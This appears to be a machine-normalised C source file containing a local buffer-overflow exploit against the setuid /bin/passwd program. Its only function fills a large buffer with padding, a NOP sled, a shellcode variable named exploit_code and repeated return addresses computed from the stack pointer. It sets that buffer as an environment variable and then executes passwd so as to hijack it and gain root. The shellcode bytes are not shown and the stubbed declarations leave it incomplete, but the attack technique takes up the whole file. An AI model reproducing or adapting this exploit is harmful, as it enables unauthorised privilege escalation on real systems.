#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 size_t ADJUST ; 
 char* EV ; 
 int NOP ; 
 int OFFSET ; 
 size_t RETS ; 
 size_t STARTADR ; 
 int /*<<< orphan*/  FUNC0 (char*,char*,char*) ; 
 char* exploit_code ; 
 int FUNC1 () ; 
 size_t i ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,size_t) ; 
 int /*<<< orphan*/  FUNC3 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int ret_adr ; 
 size_t FUNC6 (char*) ; 
 char* x ; 

FUNC7()
{
    FUNC5("LANG=");
    FUNC3(x,'x',70000);

    for (i = 0; i < ADJUST; i++) x[i]=0x40;
    for (i = ADJUST; i < 1000; i+=4){
        x[i+3]=NOP & 0xff;
        x[i+2]=(NOP >> 8 ) &0xff;
        x[i+1]=(NOP >> 16 ) &0xff;
        x[i+0]=(NOP >> 24 ) &0xff;
    }
    for (i=0;i<FUNC6(exploit_code);i++) x[STARTADR+i+ADJUST]=exploit_code[i];
    ret_adr=FUNC1()-OFFSET;
    FUNC4("jumping address : %lx\n",ret_adr);
    if ((ret_adr & 0xff) ==0 ){   
        ret_adr -=16;
        FUNC4("New jumping address : %lx\n",ret_adr);
    }
    for (i = ADJUST+RETS; i < RETS+600; i+=4){
        x[i+3]=ret_adr & 0xff;
        x[i+2]=(ret_adr >> 8 ) &0xff;
        x[i+1]=(ret_adr >> 16 ) &0xff;
        x[i+0]=(ret_adr >> 24 ) &0xff;
    }
    FUNC2(x,EV,FUNC6(EV));
    x[3000]=0;
    FUNC5(x);
    FUNC0("/bin/passwd","passwd",(char *)0);
}